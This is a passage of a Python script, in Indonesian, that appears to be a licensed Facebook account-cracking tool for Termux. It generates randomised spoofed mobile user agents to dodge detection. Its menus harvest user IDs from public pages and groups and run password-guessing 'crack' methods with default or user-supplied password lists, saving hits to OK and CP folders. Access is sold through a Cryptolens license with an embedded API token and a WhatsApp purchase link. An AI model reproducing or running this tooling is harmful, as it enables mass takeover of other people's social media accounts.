    strvpoco = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(poco))} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvsamsung = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(samsung))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} Mobile Safari/537.36"
    strvredmi1 = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(redmi))} Build/{str(rc(lonte))}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(90,109))}.0.{str(rr(111,6666))}.{str(rr(10,400))} UCBrowser/{str(rr(1,20))}.{str(rr(1,10))}.0.{str(rr(111,5555))} Mobile Safari/537.36 OPR/{str(rr(10,80))}.{str(rr(1,10))}.{str(rr(111,5555))}.{str(rr(111,99999))}"
    strvgt = f"Mozilla/5.0 (Linux; Android {str(rr(9,12))}; {str(rc(gt))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(90,109))}.0.{str(rr(3900,4900))}.{str(rr(40,150))} Mobile Safari/537.36 {str(rc(aZ))}{str(rr(1,1000))}"
    strviphonee = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rc(iphonee))} like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Mobile/14A456 [FBAN/MessengerForiOS;FBAV/90.0.0.24.70;FBBV/39954546;FBRV/0;FBDV/iPhone{str(rr(1,8))},{str(rr(1,4))};FBMD/iPhone;FBSN/iOS;FBSV/10.0.2;FBSS/2;FBCR/glo;FBID/phone;FBLC/en_GB;FBOP/5]"
    uateddy = random.choice(
        [
            strvvivo,
            strvinfinix,
            strvmito,
            strvicherry,
            strvpoco,
            strvsamsung,
            strvgt,
            strviphonee,
        ]
    )
    agen2.append(uateddy)


def menu():
    menu_ku()
    Fajar = input(f" [!] ᴩɪʟɪʜᴀɴ : ")
    if Fajar == "1" or Fajar == "01":
        Publik()

    elif Fajar == "2" or Fajar == "02":
        print()
        prints(f" [!]{H2} masukan id grup yang bersifat publik {P2}")
        user = input(" [!] mauskan id : ")
        for uid in user.split(","):
            if user == "" or user == " ":
                print(" id tidak valid")
            else:
                grup("https://iphone.facebook.com/groups/" + uid + "/")
        Setting()

    elif Fajar == "3" or Fajar == "03":
        crack_file()

    elif Fajar == "4" or Fajar == "04":
        os.remove(".cok.txt")
        os.remove(".token.txt")
        exit(" [!] Logout berhasil")

    elif Fajar == "5" or Fajar == "05":
        clon_email()


def Setting():
    menu_mtd()
    Fz = input(f" [!] ᴩɪʟɪʜᴀɴ : ")
    if Fz == "1" or Fz == "01":
        metode.append("id_1")
    elif Fz == "2" or Fz == "2":
        metode.append("id_2")
    elif Fz == "3" or Fz == "3":
        metode.append("id_3")
    else:
        metode.append("id_3")
        # metode.append('id_4')
    print()
    pwplus = input(" [!] tambahkan sandi manual? y/t : ")
    if pwplus in ["y", "Y"]:
        pwpluss.append("ya")
        pwku = input(" [!] Masukkan Password : ")
        pwkuh = pwku.split(",")
        for xpw in pwkuh:
            pwnya.append(xpw)
    else:
        pwpluss.append("no")
        print(f" [!] crack dengan sandi -> bawaan sc")

    take_password()


ii = datetime.now()
bln = ii.month
thn = ii.year
hri = ii.day


def buy():
    os.system("clear")
    print("%s___________ ________.    %s__%s" % (P, M, P))
    print("%s\_   _____// ____\_ |__ %s|  | ____ __%s" % (P, M, P))
    print("%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s" % (P, M, P))
    print("%s |        \|  |   | \_\ \%s    <|  |  /%s" % (P, M, P))
    print("%s/_______  /|__|   |___  /%s__|_ \____/%s" % (P, M, P))
    print("%s        \/            \/ %s    \/%s" % (P, M, P))
    print()
    print(f""" [!] {P}1.Beli Licensi\n [!] 2.Masukan Licensi\n [!] 3.Log Out""")
    print()
    asu = input("Choise :  ")
    if asu in ["1", "01"]:
        os.system("xdg-open http://wa.me//6285894841695?text=bang+aku+mau+beli+lisensi")
        buy()
    elif asu in ["2", "02"]:
        print(f" [!] {P}Harap untuk tidak membagikan license kepada orang lain")
        print()
        jembut = input(" [!] Masukan Licensi : ")
        if jembut in ["", " "]:
            print(f" [!] {M}Tolong Jangan Kosong Bro")
            exit()
        else:
            var(jembut)
    elif asu in ["3", "03"]:
        print(" [!] Makasih Telah Berkunjung")
        exit()
    else:
        buy()


def var(api):
    with requests.Session() as asu:
        try:
            link = asu.get(
                "https://app.cryptolens.io/api/key/Activate?token=WyI1NjgwMDMxNyIsIjRDaHIwMExZUUhveGhJNXB2aHF0U0FUQXZCalNwTnFMSDVZSGxGOHQiXQ==&ProductId=21326&Key={}".format(
                    api
                )
            ).json()
            hasil = link["licenseKey"]["expires"][:10]
            tahu, bula, tang = hasil.split("-")
            isin = "%s%s%s" % (tang, bula, tahu)
            neww = "%s%s%s" % (hri, bln, thn)
            form = "%d%m%Y"
            tess = datetime.strptime(isin, form)
            mekk = datetime.strptime(neww, form)
            z = tess - mekk
            port = z.days
            if port < 1:
                print(" [!] ups, lisensi kamu sudah tidak aktif, hubungi admin")
                input(" Enter ")
                os.system("rm -rf data/key.txt data/sisa.txt")
                buy()
            else:
                print()
                print(f" [!] {H}Hore Login Berhasil Selamat Menikmati ")
                print(
                    f""" [!] {P}Kadarluarsa   : {H}{port} hari lagi
{P} [!] Kunci lisensi : {H}{api}{P}"""
                )
                print()
                open("data/key.txt", "w").write(api)
                open("data/sisa.txt", "w").write(f"{port}")
                input(" [!] Enter ")
                MainTermux()
        except KeyError:
            print(f" [!] {M}Licensi anda sudah kadarluarsa, silakan hubungi admin")
            input(f" [![ {H}Enter ")
            os.system("rm -rf data/key.txt")
            buy()


def cek():
    try:
        x = open("data/key.txt", "r").read()
    except FileNotFoundError:
        buy()
    try:
        x = requests.get(
            "https://app.cryptolens.io/api/key/Activate?token=WyI1NjgwMDMxNyIsIjRDaHIwMExZUUhveGhJNXB2aHF0U0FUQXZCalNwTnFMSDVZSGxGOHQiXQ==&ProductId=21326&Key=%s"
            % (x)
        ).json()["licenseKey"]["key"]
        MainTermux()
    except KeyError:
        print(f" [!] {P}lisensi kamu sudah kedaluwarsa silahkan beli lisensi ke admin")
        os.system("rm -rf data/key.txt")
        os.system(
            "xdg-open https://wa.me/+6285894841695?text=oy+bang+mau+beli+lisensi+crack+Facebook"
        )
        time.sleep(2)
        exit()


def cek_lisensi_aktif():
    try:
        xz = open("data/key.txt", "r").read()
    except FileNotFoundError:
        buy()
    os.system("clear")
    cek()


def AutoFolder():
    try:
        os.mkdir("OK")
    except:
        pass
    try:
        os.mkdir("CP")
    except:
        pass
    try:
        os.mkdir("data")
    except:
        pass
    try:
        os.mkdir("assets")
    except:
        pass


###----------[ PEMANGGIL ]---------- ###
if __name__ == "__main__":
    try:
        with requests.Session() as ses:
            os.system("git pull")
            AutoFolder()
            cek_lisensi_aktif()
    except requests.exceptions.ConnectionError:
        prints(f" {H2} [!]{P2} koneksi internet anda bermasalah")
        time.sleep(3)
        exit()
